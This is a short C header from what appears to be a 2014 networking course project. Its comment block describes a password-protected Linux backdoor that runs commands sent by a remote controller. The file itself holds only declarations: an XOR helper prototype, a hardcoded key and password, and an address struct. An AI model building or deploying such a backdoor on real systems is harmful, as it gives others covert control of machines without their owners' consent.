/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              char *xor_encrypt(char *, char *);
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
---------------------------------------------------------------------------------------*/

#ifndef HELPERFUNCTIONS_H
#define HELPERFUNCTIONS_H
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define encryptKey "netw"
#define password "comp"
typedef struct 
{
    //int RawSocket;
    char DstHost[16];
    char SrcHost[16];
    int dport;
    int sport;
}AddrInfo;

char *xor_encrypt(char *key, char *string, int len);
void get_controller_config(char *, AddrInfo *);
#endif

